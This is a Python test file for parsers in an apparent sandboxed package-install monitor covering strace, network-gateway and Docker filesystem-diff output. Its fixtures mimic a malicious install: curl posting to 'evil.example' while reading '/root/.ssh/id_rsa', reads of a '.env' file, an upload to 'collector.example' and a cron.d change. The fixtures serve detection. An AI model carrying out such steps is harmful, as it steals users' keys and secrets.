"""Tests for artifact parsers."""

from safeinstall.parsers.strace_parser import parse_strace
from safeinstall.parsers.gateway_parser import parse_gateway_text
from safeinstall.parsers.fsdiff_parser import parse_fsdiff_text


def test_strace_parser_normalizes_realistic_syscalls() -> None:
    trace = """\
12 1732350000.100 execve("/usr/bin/python3", ["python3", "-c", "upload"], 0x0) = 0
12 1732350000.200 openat(AT_FDCWD, "/home/sandbox/.env", O_RDONLY|O_CLOEXEC) = 3
12 1732350000.300 openat(AT_FDCWD, "/tmp/output", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 4
12 1732350000.400 connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("10.0.0.2")}, 16) = -1 ENETUNREACH
12 1732350000.500 connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("10.0.0.2")}, 16) = 0
12 1732350000.600 openat(AT_FDCWD, "/usr/lib/python3.11/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
"""

    events = parse_strace(trace)

    assert [event.type for event in events] == [
        "exec",
        "file_read",
        "file_write",
        "net_connect",
        "net_connect",
    ]
    assert events[1].detail["path"] == "/home/sandbox/.env"
    assert events[2].detail["path"] == "/tmp/output"
    assert events[3].detail == {
        "host": "10.0.0.2",
        "port": 8080,
        "error": "ENETUNREACH",
    }
    assert events[4].detail == {"host": "10.0.0.2", "port": 8080}


def test_strace_parser_tracks_pid_process() -> None:
    trace = """\
31 1732350001.100 execve("/usr/bin/curl", ["curl", "-X", "POST", "evil.example"], 0x0) = 0
31 1732350001.200 openat(AT_FDCWD, "/root/.ssh/id_rsa", O_RDONLY) = 3
"""

    events = parse_strace(trace)

    assert events[0].process == "curl"
    assert events[1].process == "curl"


def test_gateway_parser_normalizes_http_dns_and_connect() -> None:
    gateway_text = """\
{"type":"dns","host":"collector.example","query_type":1,"source":"127.0.0.1:4000"}
{"type":"http_request","method":"CONNECT","host":"pypi.org","port":443,"allowed":true,"url":"pypi.org:443"}
{"type":"http_request","method":"POST","host":"collector.example","port":80,"allowed":false,"url":"http://collector.example/upload","body_excerpt":"SAFEINSTALL_CANARY","body_length":17,"body_sha256":"abc"}
not-json
"""

    events = parse_gateway_text(gateway_text)

    assert [event.type for event in events] == ["dns", "net_connect", "http_request"]
    assert events[0].detail["host"] == "collector.example"
    assert events[1].detail["allowed"] is True
    assert events[2].detail["body_excerpt"] == "SAFEINSTALL_CANARY"
    assert events[2].detail["allowed"] is False


def test_fsdiff_parser_normalizes_all_docker_formats() -> None:
    events = parse_fsdiff_text(
        "A /work/result.txt\n"
        "C /etc/cron.d/fixture\n"
        "D /tmp/removed\n"
        "1 /src\n"
        "invalid line\n"
    )

    assert [event.detail["operation"] for event in events] == [
        "added",
        "changed",
        "deleted",
        "added",
    ]
    assert [event.detail["path"] for event in events] == [
        "/work/result.txt",
        "/etc/cron.d/fixture",
        "/tmp/removed",
        "/src",
    ]
